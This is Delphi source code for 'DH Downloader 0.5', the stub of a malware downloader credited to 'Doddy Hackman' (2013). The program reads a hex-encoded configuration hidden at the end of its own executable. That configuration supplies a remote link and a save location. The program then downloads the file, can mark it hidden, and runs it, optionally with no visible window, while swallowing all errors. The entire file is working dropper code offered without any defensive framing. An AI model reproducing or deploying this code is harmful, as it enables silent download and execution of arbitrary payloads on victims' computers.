// DH Downloader 0.5
// (C) Doddy Hackman 2013

// Stub

program stub_down;

// {$APPTYPE CONSOLE}

uses
  SysUtils, Windows, URLMon, ShellApi;


// Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

var
  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  link: string;
  todo: string;
  opcion: string;
  path: string;
  nombre: string;
  rutafinal: string;
  tipodecarga: string;

begin

  try

    ob := INVALID_HANDLE_VALUE;
    code := '';

    ob := CreateFile(pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0);
    if (ob <> INVALID_HANDLE_VALUE) then
    begin
      SetFilePointer(ob, -9999, nil, FILE_END);
      ReadFile(ob, code, 9999, nose, nil);
      CloseHandle(ob);
    end;

    todo := regex(code, '[63686175]', '[63686175]');
    todo := dhencode(todo, 'decode');

    link := regex(todo, '[link]', '[link]');
    opcion := regex(todo, '[opcion]', '[opcion]');
    path := regex(todo, '[path]', '[path]');
    nombre := regex(todo, '[name]', '[name]');
    tipodecarga := regex(todo, '[carga]', '[carga]');

    rutafinal := GetEnvironmentVariable(path) + '/' + nombre;

    try

      begin
        UrlDownloadToFile(nil, pchar(link), pchar(rutafinal), 0, nil);

        if (FileExists(rutafinal)) then
        begin

          if (opcion = '1') then
          begin
            SetFileAttributes(pchar(rutafinal), FILE_ATTRIBUTE_HIDDEN);
          end;

          if (tipodecarga = '1') then
          begin
            ShellExecute(0, 'open', pchar(rutafinal), nil, nil, SW_HIDE);
          end
          else
          begin
            ShellExecute(0, 'open', pchar(rutafinal), nil, nil, SW_SHOWNORMAL);
          end;
        end;

      end;
    except
      //
    end;

  except
    //
  end;

end.

// The End ?
